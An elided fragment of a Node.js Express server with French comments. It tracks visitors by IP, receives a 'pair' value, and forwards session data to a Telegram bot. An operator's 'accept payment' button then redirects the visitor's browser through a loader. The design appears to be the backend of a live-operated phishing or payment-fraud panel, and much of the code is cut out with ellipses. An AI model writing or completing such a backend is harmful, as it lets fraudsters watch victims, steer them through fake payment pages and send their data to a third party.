...
async function sendTelegramNotif(data){
  ...
  // évite double notif si même page
  if(data.page === data.lastNotifPage) return;
  ...
  const keyboard = {
    inline_keyboard:[
      ...
      [{text:'✅ Accepter paiement', callback_data:'acceptPayment|'+data.ip}]
    ]
  };
...
app.get('/api/visit', (req,res)=>{
  const ip = getIP(req);
  sessions[ip] = sessions[ip] || {data:{page:'Accueil', ip}, redirect:null, lastNotifPage:null};
...
app.post('/api/pair', (req,res)=>{
  const {pair} = req.body;
  const ip = getIP(req);
  sessions[ip] = sessions[ip] || {data:{ip}, redirect:null, lastNotifPage:null};
...
// Polling redirection pour loader
...
app.post('/telegramWebhook', bodyParser.json(), async (req,res)=>{
  ...
  if(body?.callback_query){
    ...
    } else if(action==='acceptPayment' && sessions[ip]){
      sessions[ip].redirect = '/payment-accepted.html';
      sessions[ip].data.page = 'Paiement accepté';
      sendTelegramNotif(sessions[ip].data);
      await fetch(`${TELEGRAM_API}/answerCallbackQuery`,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({callback_query_id:cb.id,text:'Paiement accepté.'})
      });
    }
  }
  res.sendStatus(200);
